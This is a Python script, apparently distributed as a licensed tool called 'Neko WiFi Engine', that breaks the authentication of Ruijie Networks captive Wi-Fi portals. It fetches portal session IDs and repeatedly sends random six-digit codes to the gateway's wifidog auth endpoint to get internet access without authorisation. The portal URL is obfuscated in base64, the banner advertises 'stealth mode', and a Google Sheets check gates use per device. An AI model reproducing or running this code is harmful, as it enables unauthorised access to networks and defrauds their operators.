#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import json
import base64
import random
import string
import hashlib
import requests
import threading
import aiohttp
import asyncio
import ping3
from datetime import datetime, date
from urllib.parse import quote, urlparse, parse_qs, urljoin

# ==========================================
# 0. GOOGLE SHEETS LICENSE SYSTEM
# ==========================================

SHEET_CSV_URL = "https://docs.google.com/spreadsheets/d/e/2PACX-1vS9j_VFK4Uj-Xgu_9sFxcs9hncC5egTA5424mfEHxGG83NL6rXYsOxMI7TqD-N_U2bXTwezqnxQWyLk/pub?output=csv"

LICENSE_STORAGE = os.path.expanduser("~/.ruijie_license.json")
KEY_STORAGE_FILE = os.path.expanduser("~/.ruijie_device_key.txt")

def get_stable_device_id():
    if os.path.exists(KEY_STORAGE_FILE):
        try:
            with open(KEY_STORAGE_FILE, 'r') as f:
                saved_key = f.read().strip()
                if saved_key:
                    return saved_key
        except:
            pass
    
    try:
        import subprocess
        android_id = subprocess.check_output("settings get secure android_id", shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if android_id and len(android_id) > 5:
            stable_key = hashlib.md5(f"STABLE_{android_id}".encode()).hexdigest()[:16]
        else:
            import uuid
            install_path = os.path.dirname(os.path.abspath(__file__))
            stable_key = hashlib.md5(f"{install_path}{uuid.getnode()}".encode()).hexdigest()[:16]
    except:
        stable_key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    
    try:
        with open(KEY_STORAGE_FILE, 'w') as f:
            f.write(stable_key)
    except:
        pass
    
    return stable_key

def save_license_to_cache(expiry_date_str):
    data = {"device_id": get_stable_device_id(), "expiry": expiry_date_str, "verified_at": datetime.now().isoformat()}
    try:
        with open(LICENSE_STORAGE, 'w') as f:
            json.dump(data, f)
        return True
    except:
        return False

def load_license_from_cache():
    if not os.path.exists(LICENSE_STORAGE):
        return None
    try:
        with open(LICENSE_STORAGE, 'r') as f:
            data = json.load(f)
            if data.get("device_id") == get_stable_device_id():
                return data
    except:
        pass
    return None

def fetch_online_license():
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            return response.text.strip().split('\n')
    except:
        pass
    return None

def verify_license_online():
    sys_key = get_stable_device_id()
    lines = fetch_online_license()
    
    if lines is None:
        return None, None, "NETWORK_ERROR"
    
    for line in lines:
        line = line.strip()
        if not line or line.lower().startswith('key') or line.lower().startswith('device'):
            continue
        data = [d.strip().strip('"') for d in line.split(',')]
        if data and data[0] == sys_key:
            expiry_str = data[2] if len(data) >= 3 else "UNLIMITED"
            if len(data) >= 4 and "BLOCK" in data[3].upper():
                return False, expiry_str, "BLOCKED"
            if expiry_str != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d").date()
                    if date.today() > expiry_date:
                        return False, expiry_str, "EXPIRED"
                except:
                    pass
            return True, expiry_str, "ACTIVE"
    
    return False, "N/A", "NOT_FOUND"

def check_license():
    sys_key = get_stable_device_id()
    print(f"{CYAN}[*] Device ID: {WHITE}{sys_key}{RESET}")
    
    online_result, expiry_str, msg = verify_license_online()
    
    if online_result is True:
        print(f"{GREEN}[✓] License ACTIVE (Expires: {expiry_str}){RESET}")
        save_license_to_cache(expiry_str)
        return True
    elif online_result is False:
        print(f"{RED}[✗] License INVALID: {msg}{RESET}")
        cached = load_license_from_cache()
        if cached:
            cached_expiry = cached.get("expiry", "UNLIMITED")
            if cached_expiry != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(cached_expiry, "%Y-%m-%d").date()
                    if date.today() <= expiry_date:
                        print(f"{GREEN}[✓] Using CACHED license (Expires: {cached_expiry}){RESET}")
                        return True
                except:
                    pass
        return False
    else:
        cached = load_license_from_cache()
        if cached:
            cached_expiry = cached.get("expiry", "UNLIMITED")
            if cached_expiry != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(cached_expiry, "%Y-%m-%d").date()
                    if date.today() <= expiry_date:
                        print(f"{GREEN}[✓] Using CACHED license (Offline, Expires: {cached_expiry}){RESET}")
                        return True
                except:
                    pass
        print(f"{RED}[✗] No valid license found (Need internet for first activation){RESET}")
        return False

# ==========================================
# COLORS (Neko Style)
# ==========================================

RESET = "\033[0m"
BLACK = "\033[30m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
DIM = "\033[2m"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def Line():
    print(f"{DIM}{'─'*50}{RESET}")

def Logo():
    clear()
    neko_art = f"""{MAGENTA}
        ╱|、
       (˚ˎ 。7  
        |、˜〵          
        じしˍ,)ノ {RESET}{GREEN}Neko WiFi Engine{RESET}
{MAGENTA}     「 internet bypass · stealth mode 」{RESET}
"""
    print(neko_art)
    Line()
    print(f"{DIM}[*] Ruijie Network Router Bypass Tool{RESET}")
    print(f"{DIM}[*] License: Google Sheets (Admin Controlled){RESET}")
    Line()

# ==========================================
# INTERNET BYPASS FUNCTIONS
# ==========================================

async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.get(session_url, headers=headers) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
            return session_id
    except Exception as e:
        return previous_session_id

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        
        try:
            self.ip = open(".ip", "r").read().strip()
        except FileNotFoundError:
            print(f"{RED}[!] Running first time setup...{RESET}")
            setup()
            try:
                self.ip = open(".ip", "r").read().strip()
            except:
                print(f"{RED}[!] Setup failed. Please check Wi-Fi connection.{RESET}")
                sys.exit(1)

    def get_random_code(self):
        random_code = "".join(random.choice(string.digits) for _ in range(6))
        return random_code

    async def send_request(self, session, session_id, log=True):
        random_code = self.get_random_code()
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        params = {
            'token': session_id,
            'phoneNumber': random_code,
        }
        try:
            async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params=params, headers=headers) as response:
                if log:
                    status_code = f"{GREEN}{response.status}"
                    now = f"{BLUE}{time.strftime('%H:%M:%S')}"
                    ping_status = await asyncio.to_thread(ping3.ping, 'google.com')
                    ping = self.get_ping(ping_status)
                    is_open = await self.is_internet_access(session)
                    print(f"{DIM}[{now}]{RESET} {YELLOW}→{RESET} status: {status_code}{RESET} | ping: {ping} | {is_open}", end="\r")
        except:
            return
    
    async def is_internet_access(self, session):
        try:
            async with session.get("https://httpbin.org/") as req:
                return f"{GREEN}● ONLINE{RESET}"
        except:
            return f"{RED}● OFFLINE{RESET}"
    
    def get_ping(self, ping):
        if ping is None:
            return f'{RED}N/A{RESET}'
        else:
            ping = int(ping * 1000)
            if ping >= 100:
                return f'{RED}{ping}ms{RESET}'
            elif ping >= 50:
                return f'{YELLOW}{ping}ms{RESET}'
            return f'{GREEN}{ping}ms{RESET}'
    
    async def execute(self):
        Logo()
        print(f"{GREEN}[+] Neko Stealth Engine Active{RESET}")
        print(f"{DIM}[+] Press Ctrl+C to stop{RESET}")
        Line()
        
        connector = aiohttp.TCPConnector(limit=10)
        timeout = aiohttp.ClientTimeout(total=10)
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                loop = 0
                tasks = []
                while True:
                    if loop % 5 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(self.send_request(session, session_id, log=True))
                    if len(tasks) >= 5:
                        await asyncio.gather(*tasks)
                        tasks = []
                    loop += 1
                    await asyncio.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Neko Engine Stopped{RESET}")
            sys.exit()

# ==========================================
# SETUP FUNCTION (Auto-run when needed)
# ==========================================

def setup():
    print(f"{CYAN}[*] Setup Mode - Capturing Gateway Info{RESET}")
    print(f"{YELLOW}[!] Make sure you are connected to the Wi-Fi{RESET}")
    Line()
    
    try:
        localhost = requests.get("http://192.168.0.1", timeout=10).url
        ip = re.search(r'gw_address=(.*?)&', localhost).group(1)
        
        print(f"{GREEN}[✓] Gateway IP: {ip}{RESET}")
        
        with open(".ip", "w") as f:
            f.write(ip)
        
        # Try to get session URL
        try:
            headers = {
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36',
            }
            req = requests.get(localhost, headers=headers).text
            session_url_match = re.search(r"href='(.*?)'</script>", req)
            if session_url_match:
                session_url = "https://portal-as.ruijienetworks.com" + session_url_match.group(1)
                with open(".session_url", "w") as f:
                    f.write(session_url)
                print(f"{GREEN}[✓] Session URL saved{RESET}")
        except:
            pass
        
        Line()
        print(f"{GREEN}[✓] Setup completed!{RESET}")
        time.sleep(1)
        
    except Exception as err:
        print(f"{RED}[✗] Setup failed: {err}{RESET}")
        print(f"{YELLOW}[!] Make sure you are connected to the Wi-Fi and try again{RESET}")
        sys.exit(1)

# ==========================================
# MAIN (One-command execution)
# ==========================================

def main():
    # Auto-run without any arguments
    Logo()
    
    # Check license first
    if not check_license():
        print(f"{RED}[!] License check failed. Use --key to get your device ID.{RESET}")
        print(f"{YELLOW}[!] Add your device ID to Google Sheets Column A{RESET}")
        sys.exit(1)
    
    # Check if setup is needed (.ip file exists?)
    if not os.path.exists(".ip"):
        print(f"{YELLOW}[!] First time setup required...{RESET}")
        setup()
    
    # Start internet bypass
    iobj = InternetAccess()
    asyncio.run(iobj.execute())

if __name__ == "__main__":
    # Command line arguments (optional overrides)
    if len(sys.argv) > 1:
        if sys.argv[1] == "--key":
            print(f"\n{GREEN}Device ID: {get_stable_device_id()}{RESET}")
            print(f"{YELLOW}Add this to Column A in Google Sheets{RESET}")
            sys.exit(0)
        elif sys.argv[1] == "--reset":
            for f in [LICENSE_STORAGE, KEY_STORAGE_FILE, ".ip", ".session_url"]:
                if os.path.exists(f):
                    os.remove(f)
            print(f"{GREEN}[✓] All cache cleared. Run again to setup.{RESET}")
            sys.exit(0)
        elif sys.argv[1] == "--setup":
            setup()
            sys.exit(0)
        elif sys.argv[1] == "--help" or sys.argv[1] == "-h":
            print(f"""
{GREEN}════════════════════════════════════════════════════════════{RESET}
{GREEN}                    NEKO WIFI ENGINE                         {RESET}
{GREEN}════════════════════════════════════════════════════════════{RESET}

{YELLOW}python bypass.py{RESET}              {DIM}# Start internet bypass (auto){RESET}
{YELLOW}python bypass.py --key{RESET}        {DIM}# Show device ID for license{RESET}
{YELLOW}python bypass.py --reset{RESET}      {DIM}# Clear all cache{RESET}
{YELLOW}python bypass.py --setup{RESET}      {DIM}# Manual setup only{RESET}

{GREEN}════════════════════════════════════════════════════════════{RESET}
""")
            sys.exit(0)
    
    # No arguments? Start bypass directly
    main()